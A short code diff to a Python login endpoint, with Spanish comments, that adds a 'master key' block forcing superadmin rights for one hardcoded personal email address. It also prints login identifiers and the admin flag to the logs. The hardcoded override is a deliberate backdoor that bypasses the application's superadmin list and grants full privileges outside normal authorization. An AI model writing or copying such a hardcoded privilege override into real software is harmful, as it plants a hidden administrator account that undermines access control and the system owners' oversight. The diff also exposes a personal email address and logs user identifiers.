@@ -432,8 +432,11 @@ async def login(req: LoginRequest):
         # Superadmin si el identificador O el email verificado están en la lista
         is_superadmin = (identifier in current_superadmins) or (verified_email in current_superadmins)
         
-        print(f"DEBUG LOGIN: Identifier={identifier}, VerifiedEmail={verified_email}")
-        print(f"DEBUG LOGIN: IsSuperAdmin={is_superadmin}")
+        # LLAVE MAESTRA: Forzar superadmin para el correo del usuario actual
+        if identifier == "ivandchaves@gmail.com" or verified_email == "ivandchaves@gmail.com":
+            is_superadmin = True
+        
+        print(f"DEBUG LOGIN: Identifier={identifier}, VerifiedEmail={verified_email}, FinalIsSuper={is_superadmin}")
         
         user_profile = None
         # Acceder a la tabla vía boto3 directamente
